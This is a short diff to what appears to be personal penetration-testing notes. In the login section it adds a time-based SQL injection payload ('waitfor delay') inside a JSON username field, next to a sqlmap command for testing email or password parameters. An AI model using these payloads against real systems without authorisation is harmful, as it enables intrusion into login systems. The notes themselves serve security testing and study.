@@ -372,6 +372,11 @@ login
 3- if there was json {} with email or password request use sqlmap  first put whole request in file.txt ==>
     sqlmap -r request.txt -p email or (password)
 
+"User":"hossam'; waitfor delay '0:0:8 --",
+"Passwd":"123"
+
+
+
 
 ----------------------------------------------------------------------------------------------
               SSRF
